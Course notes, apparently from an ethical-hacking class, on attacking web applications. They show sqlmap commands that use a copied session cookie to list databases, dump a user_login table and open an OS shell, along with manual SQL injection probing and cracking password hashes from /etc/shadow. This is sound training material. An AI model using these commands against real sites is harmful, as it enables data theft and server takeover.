---
title: 'Hacking Web Application 29/6/26 '
slug: ehip-1
order: 999
type: Class Notes
status: Active
date: '2026-06-29'
summary: ''
tags:
  - Web
files: []
links: []
cover: ''
---
**Objective:**

- Web application concepts
- Web application hacking methodology
- Web application threats

Able to hack into web server and have access to Database server is important 

Tool → Sqlmap → extract database info behind a web server (done by injecting various techniques on database server

## DB Architecture :

DB system has 1 or more databases 

A database has many tables (rows and columns, each row is a record) 

each table consist of many records

### Sqlmap

1. Extra database info of a stated website 
    - sqlmap -u “URL” -cookie=”xxxx” —dbs

after finding the database → find tables! (how to get? ) 

2. Select database and retrieve the table in it:
    - sqlmap -u “URL” —cookie=”xxx” -D moviescope -tables
3. retrieve the table content of a database for the URL 
    - sqlmap -u “URL” —cookie=”xxx” -D moviescope -T user_login —dump

[password store in clear text is no good ] → Linux store user account and password in 2 different areas 

/etc/password → store user account 

/etc/shadow → password is hashed (not in clear text → have to unhash it ) - John the ripper? + hashes.com (unhash  the password hash)

### Cookie Session

cookies are user login credentials → if website need you to login (username and password) 

cookie established → for authentication and session management 

User Login → Firefox browser receives a session cookie → document.cookie 

[right click on website → inspect → type document.cookie in Console tab → right click to copy the cookie value]

### os-shell -interactive OS Shell Prompt

sqlmap -u “URL” -cookie=”xxx” -os-shell [trigger out shell prompt ] 

os_shell > hostname [sqlmap ret

os_shell> TASKLIST

os_shell> help

### php script 

$index = $_GET[’id]  <variable in php code >  → ?id=1 **? indicates what to retrieve proceding it**

file_get_content($index)

### SQLi Index 

check if the web page is vulnerable to SQL → add a single quote (’) at the end of the pageid in the URL 

“you have an error in your SQL syntax; check the manual that corresponds to your mySQL server version for the right syntax to use near” at line 127 

if theres syntax error → run this: 

sqlmap -u “URL” -cookie=”xxxx” —dbs  

**REMINDER → IF WEBSITE DOESNT NEED YOU TO LOGIN DONT NEED TO ADD COOKIE**
